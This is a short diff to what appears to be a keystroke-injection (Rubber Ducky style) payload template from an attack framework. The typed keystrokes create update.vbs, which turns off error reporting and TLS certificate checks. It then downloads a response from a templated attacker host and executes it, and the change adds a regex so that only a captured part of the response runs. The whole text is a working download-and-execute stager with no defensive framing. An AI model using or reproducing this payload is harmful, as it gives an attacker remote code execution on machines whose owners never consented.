@@ -6,10 +6,11 @@ ENTER
 DELAY 400
 STRING copy /Y con update.vbs
 ENTER
-STRING On Error Resume Next:Set X=CreateObject("MSXML2.ServerXMLHTTP.6.0")
+STRING On Error Resume Next:Set Y=New RegExp:Y.Pattern="((.|\n)+)":
+STRING Set X=CreateObject("MSXML2.ServerXMLHTTP.6.0")
 STRING :X.setOption 2,13056:X.Open"GET",
 STRING "<http_prefix>://<host_and_port><registered_uri_path>"
-STRING ,0:X.Send:Execute X.responseText
+STRING ,0:X.Send:Execute (Y.Execute(X.responseText).Item(0).Submatches(0))
 ENTER
 CTRL z
 ENTER
